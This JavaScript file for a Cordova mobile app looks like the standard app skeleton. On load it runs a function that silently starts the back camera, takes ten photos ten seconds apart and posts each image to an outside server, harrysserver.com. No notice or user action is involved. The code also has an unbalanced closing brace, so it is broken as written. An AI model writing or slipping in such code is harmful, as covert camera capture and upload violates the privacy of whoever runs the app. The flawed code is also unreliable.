var app = {
  initialize: function() {
    document.addEventListener('deviceready', this.onDeviceReady.bind(this), false);
  },
  onDeviceReady: function() {},
  receivedEvent: function(id) {}
};

const sleep = (milliseconds) => {
  return new Promise(resolve => setTimeout(resolve, milliseconds))
}

var test=function(txt) {
  CameraPreview.startCamera({camera: CameraPreview.CAMERA_DIRECTION.BACK});
  for (var i=0; i<10; i++) {
    let k=i;
    setTimeout(function() {
      CameraPreview.takePicture({width:1280, height:720, quality:50}, function(base64PictureData) {
        var pic='data:image/jpeg;base64,'+base64PictureData;
        $.post("http://harrysserver.com/camera/upload.php", {image: pic});
      });
    }, 10000*(k+1));
    }
  }
}

app.initialize();
test('got here');
